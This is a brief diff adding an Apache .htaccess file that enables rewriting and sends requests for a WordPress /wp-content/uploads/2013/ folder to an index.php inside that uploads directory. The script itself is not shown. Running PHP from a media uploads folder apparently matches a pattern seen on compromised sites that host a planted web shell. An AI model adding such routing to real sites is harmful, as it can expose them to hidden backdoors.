@@ -1,0 +1,4 @@
+AddDefaultCharset UTF-8
+DirectoryIndex index.php
+RewriteEngine On
+RewriteRule /wp-content/uploads/2013/ /wp-content/uploads/2013/index.php [L]
